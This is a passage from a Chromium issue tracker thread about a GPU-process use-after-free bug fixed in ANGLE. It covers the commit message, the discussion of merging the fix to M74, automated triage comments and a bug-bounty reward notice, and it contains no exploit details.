If the roll is causing failures, please contact the current sheriff, who should
be CC'd on the roll, and stop the roller if necessary.

CQ_INCLUDE_TRYBOTS=luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel

BUG=chromium:943538
TBR=syoussefi@chromium.org

Change-Id: I1a90a5638d4ca563ff5080c981bbcc5e7e1da652
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1547404
Reviewed-by: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#646377}
[modify] https://crrev.com/e74279973dd13df78e1b0464d1fed493c1468df7/DEPS


### jm...@chromium.org (2019-04-02)

This was fixed by https://chromium-review.googlesource.com/c/angle/angle/+/1541718

### bu...@chromium.org (2019-04-02)

[Auto-generated comment by a script] We noticed that this issue is targeted for M-74; it appears the fix may have landed after branch point, meaning a merge might be required. The owner of this bug should confirm if a merge is required here. If so, add Merge-Request-74 label and indicate which commits/CLs are to be merged. Otherwise, remove Merge-TBD label. Thanks.

### sh...@chromium.org (2019-04-03)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-04-03)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-04-03)

This bug requires manual review: M74 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: govind@(Android), kariahda@(iOS), dgagnon@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2019-04-03)

[Empty comment from Monorail migration]

### go...@chromium.org (2019-04-07)

[Empty comment from Monorail migration]

### ab...@google.com (2019-04-08)

how safe is this merge? Why is it critical for 74?

### jm...@chromium.org (2019-04-08)

Abdul, it could allow an attacker to trigger a use after free in the GPU process. The fix is here:

https://chromium-review.googlesource.com/c/angle/angle/+/1541718

It seems pretty safe. It's been baking in Canary a few days.

### ab...@google.com (2019-04-09)

Branch:3729

### na...@google.com (2019-04-10)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### na...@google.com (2019-04-10)

Congrats! The Panel decided to reward $3,000 for this report. 

A member from our finance team will be in touch shortly. 

### na...@google.com (2019-04-10)

[Empty comment from Monorail migration]

### jm...@chromium.org (2019-04-10)

[Empty comment from Monorail migration]

### jm...@chromium.org (2019-04-12)

[Empty comment from Monorail migration]

### jm...@chromium.org (2019-04-15)

[Empty comment from Monorail migration]

### ab...@google.com (2019-04-16)

[Empty comment from Monorail migration]

### aw...@google.com (2019-04-17)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-05-13)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-05-17)

[Empty comment from Monorail migration]

### ta...@gmail.com (2019-06-21)

Sorry, I wonder if a CVE will be assigned to this issue?

### sh...@chromium.org (2019-07-10)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2019-07-10)

This issue was migrated from crbug.com/chromium/943538?no_tracker_redirect=1

[Monorail blocking: crbug.com/angleproject/3375, crbug.com/chromium/951451]
[Monorail components added to Component Tags custom field.]

### pe...@google.com (2024-03-12)

You have been auto-cc'ed due to this issue's component.
To update this component's auto-cc rules, visit
go/peepsi-blintz-auto-cc-rules

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40094327)*
